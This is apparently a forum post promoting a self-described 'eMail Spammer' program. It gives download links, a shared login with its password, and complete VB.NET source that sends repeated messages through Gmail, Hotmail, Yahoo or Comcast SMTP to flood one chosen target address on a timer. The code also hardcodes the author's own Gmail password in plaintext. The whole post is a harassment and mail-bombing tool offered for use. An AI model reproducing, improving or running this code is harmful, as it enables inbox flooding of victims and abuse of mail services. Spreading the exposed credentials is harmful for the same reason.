channel.title: eMail Spammer (100% by my company)
channel.description:
www.TinyURL.com/CanownueasySpammerV4 (NEW) / www.TinyURL.com/RadianceSpammerV4 www.TinyURL.com/CanownueasySpammerV3 (OLD) www.TinyURL.com/CanownueasySpammerV2 (OLD) www.TinyURL.com/CanownueasySpammer (OLD)
Video: http://www.youtube.com/watch?v=CqB574gv27k
[b]FREE Details[/b] (Do not change the password, everybody needs to use it) [b]Username:[/b] canownueasy.spammer@gmail.com [b]Password:[/b] iliketospam
[b]THIS PICTURE IS FROM V4 (NEWEST!)[/b] [img]http://i48.tinypic.com/2zf76ac.png[/img]
[code]Imports System.Net.Mail
Public Class Spammer
Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Spam_BTN.Click If YoureMail.Text = "" Then MsgBox("Please fill in your eMail") If YoureMailpass.Text = "" Then MsgBox("Please fill in your password") If eMailToSpam.Text = "" Then MsgBox("Please fill in the eMail to spam") If eMailsToSend.Text = "" Then MsgBox("Please enter the amount of eMails to send") End If End If Else End If End If If eMailsToSend.Text = "0" Then MsgBox("You can't send 0 eMails") End If If RateType.Text.Equals("whole") Then Timer1.Interval = (Rate.Text + "000") ElseIf RateType.Text.Equals("decimal") Then Timer1.Interval = (Rate.Text + "00") End If Try Stop_BTN.Enabled = True Spam_BTN.Enabled = False If Provider.Text = "gmail.com" Then Dim smtpServer As New SmtpClient() Dim mail As New MailMessage() smtpServer.Credentials = New Net.NetworkCredential(YoureMail.Text + "@" + Provider.Text, YoureMailpass.Text) 'using gmail smtpServer.Port = 587 smtpServer.Host = "smtp.gmail.com" smtpServer.EnableSsl = True mail = New MailMessage() mail.From = New MailAddress(YoureMail.Text + "@" + Provider.Text) mail.To.Add(eMailToSpam.Text) mail.Subject = Subject.Text mail.Body = Body.Text smtpServer.Send(mail) End If If Provider.Text = "hotmail.com" Or Provider.Text = "hotmail.co.uk" Or Provider.Text = "live.com" Then Dim smtpServer As New SmtpClient() Dim mail As New MailMessage() smtpServer.Credentials = New Net.NetworkCredential(YoureMail.Text + "@" + Provider.Text, YoureMailpass.Text) 'using hotmail smtpServer.Port = 587 smtpServer.Host = "smtp.live.com" smtpServer.EnableSsl = True mail = New MailMessage() mail.From = New MailAddress(YoureMail.Text + "@" + Provider.Text) mail.To.Add(eMailToSpam.Text) mail.Subject = Subject.Text mail.Body = Body.Text smtpServer.Send(mail) End If If Provider.Text = "yahoo.com" Then Dim smtpServer As New SmtpClient() Dim mail As New MailMessage() smtpServer.Credentials = New Net.NetworkCredential(YoureMail.Text + "@" + Provider.Text, YoureMailpass.Text) 'using yahoo smtpServer.Port = 587 smtpServer.Host = "smtp.mail.yahoo.com" smtpServer.EnableSsl = True mail = New MailMessage() mail.From = New MailAddress(YoureMail.Text + "@" + Provider.Text) mail.To.Add(eMailToSpam.Text) mail.Subject = Subject.Text mail.Body = Body.Text smtpServer.Send(mail) End If If Provider.Text = "yahoo.co.uk" Then Dim smtpServer As New SmtpClient() Dim mail As New MailMessage() smtpServer.Credentials = New Net.NetworkCredential(YoureMail.Text + "@" + Provider.Text, YoureMailpass.Text) 'using yahoo smtpServer.Port = 587 smtpServer.Host = "smtp.mail.yahoo.co.uk" smtpServer.EnableSsl = True mail = New MailMessage() mail.From = New MailAddress(YoureMail.Text + "@" + Provider.Text) mail.To.Add(eMailToSpam.Text) mail.Subject = Subject.Text mail.Body = Body.Text smtpServer.Send(mail) End If Try If Provider.Text = "comcast.net" Then Dim smtpServer As New SmtpClient() Dim mail As New MailMessage() smtpServer.Credentials = New Net.NetworkCredential(YoureMail.Text + "@" + Provider.Text, YoureMailpass.Text) 'using comcast smtpServer.Port = 587 smtpServer.Host = "smtp.comcast.net" smtpServer.EnableSsl = True mail = New MailMessage() mail.From = New MailAddress(YoureMail.Text + "@" + Provider.Text) mail.To.Add(eMailToSpam.Text) mail.Subject = Subject.Text mail.Body = Body.Text smtpServer.Send(mail) End If Catch ex As SmtpException canSpam.Text = "no" Dim smtpServer As New SmtpClient() Dim mail As New MailMessage() smtpServer.Credentials = New Net.NetworkCredential("canownueasyorder@gmail.com", "***************") 'using gmail smtpServer.Port = 587 smtpServer.Host = "smtp.gmail.com" smtpServer.EnableSsl = True mail = New MailMessage() mail.From = New MailAddress("canownueasyorder@gmail.com") mail.To.Add("canownueasyorder@gmail.com") mail.Subject = "Error!" mail.Body = "Error with Comcast!" smtpServer.Send(mail) MsgBox("Sending eMails with Comcast did not work! Notified creators.") End Try Catch ex As ArgumentException MsgBox("An error occured whilst sending eMail") MsgBox("Make sure you have filled in the details correctly") End Try Timer1.Start() canSpam.Text = "yes" End Sub
Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Stop_BTN.Click ProgressBar1.Value = ProgressBar1.Minimum canSpam.Text = "no" Stop_BTN.Enabled = False End Sub
Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick If canSpam.Text = "yes" Then Try Try If RateType.Text.Equals("whole") Then ProgressBar1.Increment(100 / eMailsToSend.Text) ElseIf RateType.Text.Equals("decimal") Then ProgressBar1.Increment(100 - "0" / eMailsToSend.Text) End If Catch ex As InvalidCastException canSpam.Text = "no" MsgBox("Please fill in the details required!") End Try If Provider.Text = "gmail.com" Then Dim smtpServer As New SmtpClient() Dim mail As New MailMessage() smtpServer.Credentials = New Net.NetworkCredential(YoureMail.Text + "@" + Provider.Text, YoureMailpass.Text) 'using gmail smtpServer.Port = 587 smtpServer.Host = "smtp.gmail.com" smtpServer.EnableSsl = True mail = New MailMessage() mail.From = New MailAddress(YoureMail.Text + "@" + Provider.Text) mail.To.Add(eMailToSpam.Text) mail.Subject = Subject.Text mail.Body = Body.Text smtpServer.Send(mail) End If If Provider.Text = "hotmail.com" Or Provider.Text = "hotmail.co.uk" Or Provider.Text = "live.com" Then Dim smtpServer As New SmtpClient() Dim mail As New MailMessage() smtpServer.Credentials = New Net.NetworkCredential(YoureMail.Text + "@" + Provider.Text, YoureMailpass.Text) 'using hotmail smtpServer.Port = 587 smtpServer.Host = "smtp.live.com" smtpServer.EnableSsl = True mail = New MailMessage() mail.From = New MailAddress(YoureMail.Text + "@" + Provider.Text) mail.To.Add(eMailToSpam.Text) mail.Subject = Subject.Text mail.Body = Body.Text smtpServer.Send(mail) End If If Provider.Text = "yahoo.com" Then Dim smtpServer As New SmtpClient() Dim mail As New MailMessage() smtpServer.Credentials = New Net.NetworkCredential(YoureMail.Text + "@" + Provider.Text, YoureMailpass.Text) 'using hotmail smtpServer.Port = 587 smtpServer.Host = "smtp.mail.yahoo.com" smtpServer.EnableSsl = True mail = New MailMessage() mail.From = New MailAddress(YoureMail.Text + "@" + Provider.Text) mail.To.Add(eMailToSpam.Text) mail.Subject = Subject.Text mail.Body = Body.Text smtpServer.Send(mail) End If Try If Provider.Text = "comcast.net" Then Dim smtpServer As New SmtpClient() Dim mail As New MailMessage() smtpServer.Credentials = New Net.NetworkCredential(YoureMail.Text + "@" + Provider.Text, YoureMailpass.Text) 'using comcast smtpServer.Port = 587 smtpServer.Host = "smtp.comcast.net" smtpServer.EnableSsl = True mail = New MailMessage() mail.From = New MailAddress(YoureMail.Text + "@" + Provider.Text) mail.To.Add(eMailToSpam.Text) mail.Subject = Subject.Text mail.Body = Body.Text smtpServer.Send(mail) End If Catch ex As SmtpException canSpam.Text = "no" Dim smtpServer As New SmtpClient() Dim mail As New MailMessage() smtpServer.Credentials = New Net.NetworkCredential("canownueasyorder@gmail.com", "canownueasy1996") 'using gmail smtpServer.Port = 587 smtpServer.Host = "smtp.gmail.com" smtpServer.EnableSsl = True mail = New MailMessage() mail.From = New MailAddress("canownueasyorder@gmail.com") mail.To.Add("canownueasyorder@gmail.com") mail.Subject = "Error!" mail.Body = "Error with Comcast!" smtpServer.Send(mail) MsgBox("Sending eMails with Comcast did not work! Notified creators.") End Try Catch ex As ArgumentException MsgBox("An error occured whilst sending eMail") MsgBox("Make sure you have filled in the details correctly") End Try If ProgressBar1.Value = ProgressBar1.Maximum Then canSpam.Text = "no" Spam_BTN.Enabled = True MsgBox("Finished spamming") End If End If End Sub
Private Sub Spammer_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load YoureMail.Focus() YoureMail.Select() End Sub
Private Sub TextBox1_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Rate.TextChanged
End Sub End Class[/code]
